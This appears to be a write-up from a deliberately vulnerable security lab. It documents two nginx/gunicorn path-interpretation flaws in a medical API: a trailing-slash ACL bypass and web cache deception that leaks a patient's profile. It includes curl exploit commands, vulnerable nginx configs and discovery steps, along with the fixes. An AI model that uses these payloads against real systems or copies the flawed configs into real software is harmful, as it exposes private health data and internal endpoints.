---
id: API8:2023
title: "Security Misconfiguration — Reverse-Proxy ACL Bypass via nginx ↔ gunicorn Path-Processing Discrepancy"
category: API
status: DONE
severity: High
owasp: "API8:2023 — Security Misconfiguration"
cwe: "CWE-16 (Configuration) / CWE-436 (Interpretation Conflict) / CWE-863 (Incorrect Authorization) / CWE-524 (Use of Cache Containing Sensitive Information)"
source_docs:
  - "stages/01_spec/output/API8-misconfig-spec.md"
  - "stages/01_spec/output/API8-wcd-spec.md"
affected_components:
  - cloud_api/careotter/proxy/nginx.vuln.conf
  - cloud_api/careotter/proxy/nginx.secure.conf
  - cloud_api/careotter/proxy/entrypoint.sh
  - cloud_api/careotter/proxy/Dockerfile
  - cloud_api/careotter/docker-compose.yml
  - cloud_api/careotter/api_server/app.py
verified_date: 2026-06-09
---

# API8 — Security Misconfiguration (Reverse-Proxy ACL Bypass)

> **OWASP:** API8:2023 — Security Misconfiguration
> **CWE:** CWE-16 / CWE-436 / CWE-863
> **Severity:** High

> **Toggle.** `VULNERABLE` (passed to both containers via `docker-compose.yml`) selects the reverse proxy's ACL config in `proxy/entrypoint.sh`. **`VULNERABLE=1`** installs `nginx.vuln.conf` — an **exact-match** (`location =`) ACL that a trailing slash bypasses, because the Flask app routes **slash-insensitively** (`app.url_map.strict_slashes = False`). **`VULNERABLE=0`** installs `nginx.secure.conf` — **normalized** prefix/regex matching that covers the variant, so the bypass is closed.

---

## Why It Matters

**Security Misconfiguration (API8:2023)** covers hardening that is missing, inconsistent, or applied at the wrong layer. CareOtter's Cloud API ships several surfaces that have **no application-level authentication** and were never meant to face the internet: the **DB-debug** endpoints (`/api/db/info`, `/api/db/test`), the **lab-init** route (`/initialize_iot`, which discloses default credentials), and the **admin panel** pages (`/admin/*`). The realistic operational fix is to put a **reverse proxy (nginx)** in front of the app and **deny those paths from outside**, allowing them only internally.

This lab introduces that proxy and **misconfigures it**: the ACL is enumerated as **exact-match** rules, so it is the *only* control for the no-auth endpoints **and** it disagrees with how the backend interprets the path. An **external, unauthenticated** attacker appends a trailing slash and slips straight past the `deny` — reaching the DB-debug endpoints, the credential-disclosing init route, and (chained with API2) the admin panel. No credential, no app bug — just two servers in the HTTP chain that **parse the same request differently** (a confused proxy, CWE-436).

---

## The topology

```
Before:  client ── :5002 ──► gunicorn (careotter-api)        [api published directly]
After:   client ── :5002 ──► nginx (careotter-proxy) ──► gunicorn (careotter-api, internal-only)
```

- New service **`careotter-proxy`** owns the external `:5002`; **`careotter-api`** no longer publishes a port and is reachable only on the internal `careotter-net` (at `careotter-api:5002`). Legitimate internal/admin access goes **direct** to the API container; the public edge is the proxy.
- The proxy denies the "internal-only" bundle:

| Protected path | App-level auth? | Bypass payoff |
|----------------|-----------------|---------------|
| `/api/db/info` | **none** | DB metadata (size, record counts, ranges) — unauthenticated read (**`200`**) |
| `/api/db/test` | **none** | no-auth debug-write handler — the bypass reaches it (proves the ACL miss); the handler itself returns **`500`** in the current build (`store_vitals` now requires `device_mac`) |
| `/initialize_iot` | **none** | default credentials in plaintext + DB seed (**`200`** on a fresh DB; `409` once initialized) |
| `/admin/dashboard` `…/network` `…/config` `…/services` `…/logs` `…/users` | `@web_admin_required` (cookie) | reaches the handler; full panel **only when chained with an API2 forged admin JWT** |

> **The proxy only guards the external edge — the API7 SSRF sidesteps it.** This ACL governs ingress from *outside*. It cannot constrain a request the server makes to its own loopback, which is exactly the **API7** confused-deputy: that chain coerces `careotter-api` into calling `http://127.0.0.1:5002/api/users/delete` — its **own** gunicorn, not the proxy container — so the request never traverses nginx and the edge ACL is irrelevant to it (the loopback branch of `/api/users/delete` is not even in the deny bundle). Both vulnerabilities share one root cause: trusting **network position** ("it came through the proxy" or "it came from loopback") instead of authenticating. The reverse proxy hardens the external surface and does **nothing** for the internal confused-deputy.

---

## The vulnerability

`proxy/nginx.vuln.conf` enumerates the sensitive URLs with **exact-match** locations:

```nginx
location = /api/db/info  { return 403; }
location = /admin/users  { return 403; }
location = /initialize_iot { return 403; }
# … the rest of the bundle …
location / { proxy_pass http://careotter-api:5002; }
```

`api_server/app.py` makes the app **slash-insensitive** (one line, ungated):

```python
app = Flask(__name__)
app.url_map.strict_slashes = False   # "/x" and "/x/" route to the same handler
```

nginx exact-match is **literal**: `location = /api/db/info` matches *only* the string `/api/db/info`. The variant `/api/db/info/` does **not** match → it falls through to `location /` → is proxied to gunicorn → werkzeug, with `strict_slashes = False`, routes `/api/db/info/` to the **`/api/db/info` handler**. The proxy and the WSGI app disagree on the canonical form, so the deny is bypassed while the handler still runs:

```
GET /api/db/info     →  nginx exact-match denies         →  403
GET /api/db/info/    →  nginx exact-match misses; proxied →  200  (handler reached)
```

The bypass is a **plain trailing slash** — no percent-encoding — so it is independent of the WSGI server's decoding (gunicorn forwards `PATH_INFO` verbatim). nginx 1.30.1 **does** normalize `%2f`, `%2e`, `//` and `/./` (those all stay denied); the exact-match-vs-slash gap is the reliable discrepancy.

![[api8_forbidden.png]]

![[api8_bypass.png]]


### Secure mode (`VULNERABLE=0`)

`proxy/nginx.secure.conf` matches with normalized prefix/regex that covers the variant:

```nginx
location ~ ^/api/db/           { return 403; }   # matches /api/db/info AND /api/db/info/
location ~ ^/admin/            { return 403; }
location ~ ^/initialize_iot/?$ { return 403; }
```

Both the canonical path and the trailing-slash variant return `403`. (Defense-in-depth note: a path-string proxy ACL is the *wrong* boundary regardless — the real fix is app-level auth on these endpoints, not "the request came through the proxy".)

---

## Exploit — external unauthenticated ACL bypass

**Precondition:** `VULNERABLE=1`; the stack is up with `careotter-proxy` in front (`docker compose up`); attacker is an external client of `:5002` with **no account**.

```bash
HOST=http://localhost:5002

# 1) The ACL works for the canonical path
curl -s -o /dev/null -w '%{http_code}\n' "$HOST/api/db/info"      # → 403

# 2) Bypass: append a trailing slash → 403 flips, the handler runs (no auth)
curl --path-as-is -s "$HOST/api/db/info/"                          # → 200 + DB metadata JSON
curl --path-as-is -s "$HOST/initialize_iot/"                       # → 200 default creds (409 if already seeded)

# 3) The same technique reaches the rest of the bundle (ACL bypassed = no 403):
curl --path-as-is -s -o /dev/null -w '%{http_code}\n' "$HOST/api/db/test/"   # → 500 (handler reached; debug-write errors in this build)
curl --path-as-is -s -o /dev/null -w '%{http_code}\n' "$HOST/admin/users/"   # → 302 to /admin/login (handler reached; app-auth still applies)

# 4) Chain: /admin/* reached externally + an API2 forged admin cookie → full panel
#    curl --path-as-is -s -H 'Cookie: careotter_token=<forged-admin-jwt>' "$HOST/admin/users/"
```

`--path-as-is` keeps curl from rewriting the path; the trailing slash itself is the payload.

### Discovery (how the attacker finds it)

- **403-vs-200 differential.** The bundle returns `403` on the canonical path; the standard reverse-proxy ACL-bypass playbook (append `/`, try `%2f`/`%2e`/`//`/`..`, case) is tried against each. Here the **trailing slash** is the one nginx 1.30.1 doesn't normalize away — `403` → `200` flips and the body proves the handler ran.
- The protected paths are discoverable from `robots.txt`/`CONTEXT.md`/the panel nav, but the point is the **net-layer control**, not the path: the proxy was treated as the security boundary for endpoints that have no auth of their own.

---

## Second interpretation conflict - Web Cache Deception (delimiter + normalization)

> **Sub-finding status:** DONE (verified live 2026-08-26 - victim `MISS` caches the authenticated `/api/user/profile`, attacker `HIT` with no cookie recovers the victim's profile; `VULNERABLE=0` returns `BYPASS`/`MISS` with no leak).
> **CWE:** CWE-436 (Interpretation Conflict) + CWE-524 (Use of Cache Containing Sensitive Information).

The trailing-slash ACL bypass above is one place where the nginx edge and the gunicorn origin read the same path differently. Caching is a second one, on the same pair of servers, and it leaks a patient's private profile. A shared edge cache and the origin disagree on what `GET /static/..%2f/api/user/profile;x.css` means. The cache reads it as a static `.css` asset and stores the response. The origin reads it as the dynamic, session-authenticated `/api/user/profile` handler. So a response carrying a victim's own profile (`username`, `role`, `display_name`, `profile_photo`, `created_at`) is stored by the cache under a static key and served verbatim to the next, unauthenticated client. In a medical portal this is a patient-privacy breach: any visitor to the cached URL learns who the last authenticated patient was.

`/api/user/profile` is the endpoint the patient portal already calls - `templates/profile.html` loads `static/js/profile.js`, which does `fetch('/api/user/profile')` on page load to populate the identity card. So the target is discoverable by simply browsing to `/profile` and watching the traffic, not from any inside knowledge.

### The two-part discrepancy

Neither layer is individually the bug. The vulnerability is the disagreement between them.

**Cache side (nginx).** The production vhost caches anything whose path ends in a static extension:

```nginx
location ~* \.(?:css|js|png|jpe?g|gif|svg|ico|woff2?)$ {
    proxy_cache wcd;
    proxy_cache_valid 200 60s;
    proxy_ignore_headers Set-Cookie Cache-Control Expires;   # ignore the origin's no-store: force-cache
    proxy_hide_header Cache-Control;                          # drop the origin's contradictory no-store
    add_header X-Cache-Status $upstream_cache_status always;
    add_header Cache-Control "public, max-age=60" always;    # advertise the edge TTL (the poison window)
    proxy_pass http://careotter-api:5002;                    # no URI -> raw request URI forwarded
    # ...
}
```

nginx normalizes `..%2f` before it chooses a location (the same normalization noted in "The vulnerability" above for `%2f`), so `/static/..%2f/api/user/profile;x.css` is matched as `/api/user/profile;x.css`, which ends in `.css` and lands in this block. The `/static/..%2f` prefix is therefore not what the cache keys on - it is the traversal the origin resolves. `proxy_ignore_headers` is the misconfiguration: it makes nginx store the response even though the origin marked it `private, no-store`. The cache key is the raw `$request_uri`, which carries no credential, so a victim and an attacker requesting the identical URL collide on one cache entry.

The same block also makes the poisoning observable. The origin's `Cache-Control: no-store` is contradictory once the edge has cached the response, so nginx hides it (`proxy_hide_header`) and advertises its own freshness instead (`Cache-Control: public, max-age=60`, matching `proxy_cache_valid`). Every `MISS` and `HIT` therefore carries the poisoned entry's lifetime, so an attacker reads the 60-second window straight off the response and times the harvest before it expires (and watches `X-Cache-Status` flip back to `MISS` when it does). Without this the response would echo the origin's `no-store` and reveal nothing about how long the cache holds the victim's data.

**Origin side (gunicorn).** `proxy_pass` carries no URI, so gunicorn receives the raw request line `GET /static/..%2F/api/user/profile;x.css`. A WSGI middleware in `app.py` re-derives the real route from that raw URI: it drops the `;` matrix suffix, percent-decodes (`%2f` becomes `/`), and collapses `..`.

```python
raw = environ.get('RAW_URI') or environ.get('REQUEST_URI') or environ.get('PATH_INFO', '')
path = raw.split('?', 1)[0].split(';', 1)[0]   # ';' delimiter: drop matrix params
environ['PATH_INFO'] = posixpath.normpath(unquote(path))   # decode %2f, collapse '..'
```

So `/static/..%2f/api/user/profile;x.css` resolves to `/api/user/profile`, which returns the caller's profile. Like the always-on `strict_slashes = False`, this normalizer is not gated by `VULNERABLE` - it is the origin behavior the attacker discovers. The toggle lives in the nginx cache policy.

**Why the victim's request authenticates.** `/api/user/profile` accepts the session in either form - the `Authorization: Bearer` header the portal's JavaScript sends, OR the `careotter_token` cookie (`_decode_and_validate`). The portal's own fetch uses the Bearer header, but when the victim is lured into a top-level navigation to the crafted link, the browser attaches only the `SameSite=Lax` cookie (a Bearer header from `localStorage` is never auto-attached to a navigation). The endpoint accepting that cookie is exactly what lets the victim's request return their real profile - which the cache then stores. An endpoint that only honored the Bearer header would return `401` on the victim's click and nothing would be cached.

### The mechanic

| Element in the URL | Cache (nginx) reads it as | Origin (gunicorn) reads it as |
|--------------------|---------------------------|-------------------------------|
| `.css` suffix | static asset -> cache it | (stripped with the rest of the `;` suffix) |
| `;x.css` | part of the filename | matrix delimiter -> dropped, leaving `/static/..%2f/api/user/profile` |
| `..%2f` | opaque, normalized away for location choice | `../` traversal after decoding -> collapsed |
| net path served | `/api/user/profile;x.css` (cached) | `/api/user/profile` (session-authenticated, returns the profile) |

### Discovery

- Browse `/profile` as a logged-in patient and capture the traffic. The page's `profile.js` fires `GET /api/user/profile`, which returns the caller's profile JSON. That is the dynamic, session-bearing endpoint to target.
- Probe the delimiter. Requesting `/api/user/profile;anything` still returns the profile, which proves the origin treats `;` as a path delimiter and drops the suffix.
- Probe cacheability. Appending a static extension (`/api/user/profile;x.css`) and sending the request twice shows `X-Cache-Status: MISS` then `HIT` - the dynamic response is being cached under the static key.
- Dress the path as an asset. `/static/..%2f/api/user/profile;x.css` adds the traversal so the URL looks like a static file under `/static/`, which is what makes the victim-facing link plausible.

![[api8_profile.png]]

![[api8_delimiter_servers.png]]

Trying to determine whether the origin server and the cache server have any discrepancies regarding the delimiters they use isn't always obvious, which is why it's a good idea to use automated attacks with tools like BurpSuite to rule out the vast majority of cases. You can find a list of delimiters on the website at [PortSwigger](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list).

![[api8_intruder_payload_list.png]]

It is important to disable the option that encodes URL characters.
![[api8_encode_unselected.png]]

![[api8_intruder_attack.png]]


### Exploit - patient-profile theft via the cache

**Precondition:** `VULNERABLE=1`, the stack is up with `careotter-proxy` in front, the DB is seeded (`/initialize_iot`). The victim `john_doe` is logged into the portal (holds a `careotter_token` cookie). The attacker has no account.

```bash
H=http://api.careotter.lab   # map to the proxy host via /etc/hosts

# 1) The victim is lured to the attacker's link. The browser sends the SameSite=Lax cookie:
curl -s -b v.jar --path-as-is -D - -o /dev/null \
  "$H/static/..%2f/api/user/profile;x.css" | grep -iE 'x-cache-status|cache-control'
#   X-Cache-Status: MISS            (now cached)
#   Cache-Control: public, max-age=60   (the poisoned entry lives 60s)

# 2) The attacker fetches the same URL with NO cookie and reads the cached body:
curl -s --path-as-is -D - "$H/static/..%2f/api/user/profile;x.css"
#   X-Cache-Status: HIT   Cache-Control: public, max-age=60
#   {"profile":{"username":"john_doe","role":"patient","display_name":...,"profile_photo":...,"created_at":...}}
```

`--path-as-is` stops curl from rewriting `..%2f`. Step 1 is what the victim's click does, step 2 is the theft: the attacker now holds another patient's profile, keyed to nothing but a static-looking URL. The `Cache-Control: public, max-age=60` on both responses is the poison window - the attacker harvests within 60 seconds and re-poisons when `X-Cache-Status` flips back to `MISS`. (`display_name` / `profile_photo` are `null` until that patient sets them; `username` + `role` + `created_at` already identify them.)

The victim's first request is a `MISS` that stores the profile, and the attacker's identical request with no cookie is a `HIT` that replays it - both carry `Cache-Control: public, max-age=60`.

![[api8_cache_miss.png]]

![[api8_cache_hit.png]]

---

## Expected Result

- **`VULNERABLE=1`:** `GET /api/db/info` → **403**; `GET /api/db/info/` → **200** with the real handler response (verified at the socket level). The same `403`→**not-403** flip reaches the rest of the bundle (the ACL is bypassed = the handler runs): `/initialize_iot/` → `200` (default creds on a fresh DB), `/api/db/test/` → `500` (handler reached; debug-write errors), each `/admin/*` page → `302` to login.
- **`VULNERABLE=0`:** the canonical path **and** the trailing-slash variant both → **403**; a non-protected route (e.g. `/api/vitals`) still proxies normally (`200`).
- **No-credential:** the bypass of `/api/db/*` and `/initialize_iot` needs no JWT/cookie — the proxy ACL was their only control.
- **Chain (documented):** once `/admin/*` is reachable externally, an **API2** forged admin JWT (weak `careotter_jwt_2026` secret) drives the full admin panel; the ACL bypass is the network-layer enabler.
- **WCD (`VULNERABLE=1`):** a victim request to `/static/..%2f/api/user/profile;x.css` returns `200` and populates the cache (`X-Cache-Status: MISS` then `HIT`), and an attacker request to the same URL with no cookie returns the victim's profile (`username`/`role`/`display_name`/`profile_photo`/`created_at`) from cache. Both responses carry `Cache-Control: public, max-age=60` (the origin's `no-store` is hidden), so the response itself advertises the 60-second poison window. **`VULNERABLE=0`:** the authenticated request is bypassed out of the cache (`proxy_no_cache`/`proxy_cache_bypass` on cookie/authorization), so nothing leaks.

![[api8_cache_miss.png]]

![[api8_cache_hit.png]]

Now other authenticated users can access to `john_doe` user PII accessing to this cached file. An attacker can trick another user into accessing this address while authenticated and thereby obtain their personal information.

---

## How It Should Be

- **Don't authorize on a path string at the proxy.** Network-origin ("it came through the proxy / from inside") is not authentication. Put **real auth** on `/api/db/*`, `/initialize_iot` and `/admin/*` in the app, so a proxy slip can't expose them.
- **Make the proxy and backend agree on the path.** If the proxy must filter, match the **normalized** path the backend will route (prefix/regex covering trailing slash, `merge_slashes on`, decode-then-match) — never enumerate exact literals.
- **Deny by default**, allow-list the few public paths, rather than block-listing the sensitive ones.
- **Remove the unnecessary surface.** Debug endpoints (`/api/db/*`) and the plaintext default-credential `/initialize_iot` should not exist in a deployed build.
- **Never cache a response to an authenticated request.** Key on, or bypass for, the session cookie / `Authorization` header (`proxy_no_cache $http_cookie $http_authorization`), and honor the origin's `Cache-Control: no-store` instead of overriding it with `proxy_ignore_headers`.
- **Make the origin reject the crafted path, not normalize it.** The deeper fix is app-side: refuse `;` matrix suffixes and `..` traversal on API routes rather than silently rewriting them to a real handler. As with the trailing-slash bypass, the proxy is the wrong place to carry the security decision.

---

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| AuthZ | App-level authentication on `/api/db/*`, `/initialize_iot`, `/admin/*` | Remove reliance on the proxy as the boundary (CWE-863) |
| Proxy | Normalized matching (prefix/regex, `merge_slashes on`, decode-then-match); deny-by-default | Close the interpretation conflict (CWE-436) |
| Config | Align proxy and backend path semantics (`strict_slashes`); no exact-literal ACLs | Eliminate the discrepancy class (CWE-16) |
| Attack surface | Drop debug/init endpoints from production images | Reduce what an ACL slip can reach |
| Cache | Do not cache responses to credentialed requests (`proxy_no_cache`/`proxy_cache_bypass` on cookie/auth); honor upstream `no-store` | Close the WCD leak (CWE-524) |
| Origin | Reject `;`/`..` on API paths instead of normalizing them into a valid route | Remove the origin half of the interpretation conflict (CWE-436) |

---

## Verification Checklist

- [ ] **`VULNERABLE=1`**: `GET /api/db/info` → `403`; `GET /api/db/info/` → `200` with the
      backend handler's body (socket-level, not a client that re-normalizes the path).
- [ ] **`VULNERABLE=1`**: `/initialize_iot/`, `/api/db/test/`, and each `/admin/*` page →
      `403` canonical, **not-`403`** (handler reached) with the trailing slash
      (`/initialize_iot/`→`200`; `/api/db/test/`→`500`; `/admin/*`→`302`).
- [ ] **`VULNERABLE=0`**: canonical **and** trailing-slash variant both → `403`; a
      non-protected route (`/api/vitals`) still proxies (`200`).
- [ ] **No-credential**: the `/api/db/*` and `/initialize_iot` bypass works with no
      JWT/cookie.
- [ ] **Topology**: `careotter-api` is unreachable on the host (no published port); the
      external `:5002` is served by `careotter-proxy`; internal `careotter-api:5002` works.
- [ ] **Chain note**: `/admin/*` reached externally + an API2 forged admin cookie → the
      full admin panel renders.
- [ ] **WCD (`VULNERABLE=1`)**: victim request to `/static/..%2f/api/user/profile;x.css` →
      `200`, `X-Cache-Status: MISS`; repeat → `HIT`.
- [ ] **WCD (`VULNERABLE=1`)**: attacker request (no cookie) to the same URL → `200` with
      the victim's profile JSON in the body.
- [ ] **WCD (`VULNERABLE=1`)**: both the `MISS` and the `HIT` carry `Cache-Control: public, max-age=60`
      (no `no-store` echoed), so the response advertises the cache lifetime.
- [ ] **WCD (`VULNERABLE=0`)**: attacker request to the same URL does not return a victim
      profile (`X-Cache-Status` MISS/BYPASS, `401` body).
- [ ] **WCD regression**: `/api/user/profile` still authenticates the portal's own Bearer
      fetch (`200`) and rejects no-auth (`401`); `/api/db/info/` still bypasses the ACL
      (`200`) and `/api/vitals` still proxies (`200`) with the origin normalizer active.

---

## Out of scope (other API8 candidates, not this vuln)

- Werkzeug debug-console RCE (debug enabled in production).
- Expanding `/api/db/info` content to dump the user table / password hashes.
- Clickjacking from missing `X-Frame-Options`/CSP.
- The pre-existing verbose `handle_exception` and absent security headers (baseline, not promoted here). Cache handling is no longer in this list: the cache angle is now the Web Cache Deception sub-finding above. The **CORS** angle is intentionally not used: `careotter_token` is `HttpOnly` + `SameSite=Lax` and the token also lives in origin-isolated `localStorage`, so a permissive-CORS credentialed read is not exploitable on the HTTP lab.

---

## References

- Spec: `stages/01_spec/output/API8-misconfig-spec.md`
- `cloud_api/careotter/proxy/nginx.vuln.conf` / `nginx.secure.conf` (the ACL toggle), `entrypoint.sh`, `Dockerfile`
- `cloud_api/careotter/docker-compose.yml` (proxy in front; API internal-only; `VULNERABLE` toggle)
- `cloud_api/careotter/api_server/app.py` (`app.url_map.strict_slashes = False`)
- Related: `API2_Broken_Authentication.md` — the weak/forgeable `careotter_jwt_2026` JWT secret; a **forged admin JWT** turns the `/admin/*` ACL bypass into full admin-panel control.
- Related: `API7_Server_Side_Request_Forgery.md` — a different chain reaching internal endpoints (loopback confused-deputy vs edge-proxy ACL bypass). The SSRF **bypasses this proxy entirely** — it reaches `careotter-api`'s own loopback, never nginx — so the edge ACL does nothing against it (see *The topology* note). Shared root cause: trusting network position over authentication.
